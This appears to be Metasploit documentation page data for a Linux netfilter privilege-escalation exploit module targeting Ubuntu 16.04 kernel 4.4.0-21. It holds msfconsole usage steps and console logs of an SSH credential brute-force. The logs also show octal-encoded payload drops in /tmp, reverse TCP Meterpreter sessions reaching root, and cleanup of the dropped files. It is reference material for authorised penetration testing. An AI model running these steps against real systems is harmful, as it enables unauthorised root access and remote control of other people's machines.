{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/netfilter_priv_esc_ipv4","result":{"data":{"moduleMetadataJson":{"id":"0e3a3669-34d4-53ad-8d50-d2899fcc324d","name":"Linux Kernel 4.6.3 Netfilter Privilege Escalation","fullname":"exploit/linux/local/netfilter_priv_esc_ipv4","description":"This module attempts to exploit a netfilter bug on Linux Kernels before 4.6.3, and currently\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel 4.4.0-21-generic.\n\n          Several conditions have to be met for successful exploitation:\n          Ubuntu:\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686 & libgcc.i686 (fedora) needs to be installed to compile\n          Kernel 4.4.0-31-generic and newer are not vulnerable. This exploit does not bypass SMEP/SMAP.\n\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\n          having cdefs.h (even if locally installed)","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/netfilter_priv_esc_ipv4","documentationSlug":"/modules/documentation/exploit/linux/local/netfilter_priv_esc_ipv4","referencesSlug":"/modules/references/exploit/linux/local/netfilter_priv_esc_ipv4"},"documentation":{"html":"<h2 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h2>\n<p>Originally this module was written to drop the binary files on the target via metasm.  However, metasm wasn't able to compile due to the libc6-dev-i386 requirement, so it was decided to compile on the target or drop included binary instead of compiling real time.</p>\n<p>This module (and the original exploit) are written in two parts: desc, and pwn.  Desc does the heavy lifting to prep/condition the environment, pwn does the payload executing.</p>\n<h2 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h2>\n<p>There are a few requirements for this module to work (ubuntu):</p>\n<ol>\n<li>ip_tables.ko has to be loaded (root running iptables -L will do such)</li>\n<li>shem and sham can not be installed/running</li>\n</ol>\n<p>This module has been tested against:</p>\n<ol>\n<li>Ubuntu 16.04.1 (sudo apt-get install linux-image-4.4.0-21-generic)</li>\n<li>Ubuntu 16.04 (default kernel) linux-image-4.4.0-21-generic</li>\n</ol>\n<p>This does not work against the following vulnerable systems.  Additional work may be required to the binary and C code to enable these targets.</p>\n<ol>\n<li>Fedora 24 &#x3C; <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1349722#c18\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">kernel-4.6.3-300</a></li>\n<li>Fedora 22 &#x3C; <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1349722#c19\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">kernel-4.4.14-200</a></li>\n<li>RHEL &#x3C; <a href=\"https://rhn.redhat.com/errata/RHSA-2016-1847.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">kernel-3.10.0-327.36.1.el7</a></li>\n<li>Suse &#x3C; <a href=\"http://lists.opensuse.org/opensuse-security-announce/2016-06/msg00060.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">kernel-default-3.12.59-60.45.2</a></li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/netfilter_priv_esc_ipv4</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>MAXWAIT</strong></p>\n<p>  The first stage of this priv esc can take ~35seconds to execute.  This is the timer on how long we should wait till we give up on the first stage finishing.  Defaults to 120 (seconds)</p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A folder we can write files to.  Defaults to /tmp</p>\n<p>  <strong>REEXPLOIT</strong></p>\n<p>  When re-exploiting, no need to run desc (it may even fail), so we can simply run pwn and get our shell.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-16041-with-linux-image-440-21-generic\" style=\"position:relative;\"><a href=\"#ubuntu-16041-with-linux-image-440-21-generic\" aria-label=\"ubuntu 16041 with linux image 440 21 generic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04.1 (with linux-image-4.4.0-21-generic)</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set rhosts 127.0.0.1\nrhosts =&gt; 127.0.0.1\nmsf auxiliary(ssh_login) &gt; set username nagios\nusername =&gt; nagios\nmsf auxiliary(ssh_login) &gt; set password nagios\npassword =&gt; nagios\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;nagios:nagios&#39; &#39;uid=1000(nagios) gid=1000(nagios) groups=1000(nagios),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1001(nagcmd) Linux nagios 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (127.0.0.1:36085 -&gt; 127.0.0.1:22) at 2016-09-16 01:15:34 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate\" style=\"position:relative;\"><a href=\"#escalate\" aria-label=\"escalate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed\n[+] libc6-dev-i386 is installed\n[+] gcc-multilib is installed\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Checking if ip_tables is loaded in kernel\n[+] ip_tables.ko is loaded\n[*] Checking if shem or sham are installed\n[+] shem and sham not present.\n[*] Writing desc executable to /tmp/fI1xW1Js.c\n[*] Max line length is 65537\n[*] Writing 3291 bytes in 1 chunks of 11490 bytes (octal-encoded), using printf\n[*] Executing /tmp/fI1xW1Js, may take around 35s to finish.  Watching for /tmp/GWqpwKnG to be created.\n[*] Waited 0s so far\n[*] Waited 10s so far\n[*] Waited 20s so far\n[*] Waited 30s so far\n[+] desc finished, env ready.\n[*] Writing payload to /tmp/Thzyfenv\n[*] Max line length is 65537\n[*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf\n[*] Writing pwn executable to /tmp/wmfFiQKu.c\n[*] Max line length is 65537\n[*] Writing 1326 bytes in 1 chunks of 4699 bytes (octal-encoded), using printf\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.137\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.137:60982) at 2016-09-24 17:22:47 -0400\n[+] Deleted /tmp/fI1xW1Js.c\n[+] Deleted /tmp/GWqpwKnG\n[+] Deleted /tmp/fI1xW1Js\n[+] Deleted /tmp/Thzyfenv\n[+] Deleted /tmp/wmfFiQKu.c\n[+] Deleted /tmp/wmfFiQKu\n\nmeterpreter &gt; sysinfo\nComputer     : ubuntu\nOS           : Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 (x86_64)\nArchitecture : x86_64\nMeterpreter  : x86/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0, suid=0, sgid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate-w-pre-compiled-binaries\" style=\"position:relative;\"><a href=\"#escalate-w-pre-compiled-binaries\" aria-label=\"escalate w pre compiled binaries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate w/ pre-compiled binaries</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(netfilter_priv_esc_ipv4) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed\n[-] libc6-dev-i386 is not installed.  Compiling will fail.\n[-] gcc-multilib is not installed.  Compiling will fail.\n[-] gcc is not installed.  Compiling will fail.\n[*] Dropping pre-compiled exploit on system\n[*] Checking if ip_tables is loaded in kernel\n[+] ip_tables.ko is loaded\n[*] Checking if shem or sham are installed\n[+] shem and sham not present.\n[*] Max line length is 65537\n[*] Writing 7820 bytes in 1 chunks of 21701 bytes (octal-encoded), using printf\n[*] Executing /tmp/8lQZGJdL, may take around 35s to finish.  Watching for /tmp/okDjTFSS to be created.\n[*] Waited 0s so far\n[*] Waited 10s so far\n[*] Waited 20s so far\n[*] Waited 30s so far\n[+] desc finished, env ready.\n[*] Writing payload to /tmp/2016_4997_payload\n[*] Max line length is 65537\n[*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf\n[*] Writing pwn executable to /tmp/nOO6sYqi\n[*] Max line length is 65537\n[*] Writing 8456 bytes in 1 chunks of 22023 bytes (octal-encoded), using printf\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.137\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.137:46778) at 2016-09-24 21:24:22 -0400\n[+] Deleted /tmp/okDjTFSS\n[+] Deleted /tmp/2016_4997_payload\n[+] Deleted /tmp/nOO6sYqi\n\nmeterpreter &gt; sysinfo\nComputer     : ubuntu\nOS           : Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 (x86_64)\nArchitecture : x86_64\nMeterpreter  : x86/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0, suid=0, sgid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"re-exploit\" style=\"position:relative;\"><a href=\"#re-exploit\" aria-label=\"re exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Re-exploit</h4>\n<p>In this scenario, we already exploit the box, for whatever reason our shell died.  So now we want to re-exploit, but we dont need to run desc again.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(netfilter_priv_esc_ipv4) &gt; set reexploit true\nreexploit =&gt; true\nmsf exploit(netfilter_priv_esc_ipv4) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed\n[+] libc6-dev-i386 is installed\n[+] gcc-multilib is installed\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Checking if ip_tables is loaded in kernel\n[+] ip_tables.ko is loaded\n[*] Checking if shem or sham are installed\n[+] shem and sham not present.\n[*] Writing payload to /tmp/egMfQrrI\n[*] Max line length is 65537\n[*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf\n[*] Writing pwn executable to /tmp/Yf8CAdMu.c\n[*] Max line length is 65537\n[*] Writing 1326 bytes in 1 chunks of 4699 bytes (octal-encoded), using printf\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.137\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.137:60984) at 2016-09-24 17:29:06 -0400\n[+] Deleted /tmp/egMfQrrI\n[+] Deleted /tmp/Yf8CAdMu.c\n[+] Deleted /tmp/Yf8CAdMu\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"re-exploit-w-pre-compiled-binaries\" style=\"position:relative;\"><a href=\"#re-exploit-w-pre-compiled-binaries\" aria-label=\"re exploit w pre compiled binaries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Re-exploit w/ pre-compiled binaries</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(netfilter_priv_esc_ipv4) &gt; set reexploit true\nreexploit =&gt; true\nmsf exploit(netfilter_priv_esc_ipv4) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed\n[+] libc6-dev-i386 is installed\n[-] gcc-multilib is not installed.  Compiling will fail.\n[-] gcc is not installed.  Compiling will fail.\n[*] Dropping pre-compiled exploit on system\n[*] Checking if ip_tables is loaded in kernel\n[+] ip_tables.ko is loaded\n[*] Checking if shem or sham are installed\n[+] shem and sham not present.\n[*] Writing payload to /tmp/2016_4997_payload\n[*] Max line length is 65537\n[*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf\n[*] Writing pwn executable to /tmp/SZrv2NOR\n[*] Max line length is 65537\n[*] Writing 8456 bytes in 1 chunks of 22023 bytes (octal-encoded), using printf\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.137\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.137:60996) at 2016-09-24 20:47:03 -0400\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0e3a3669-34d4-53ad-8d50-d2899fcc324d"}}}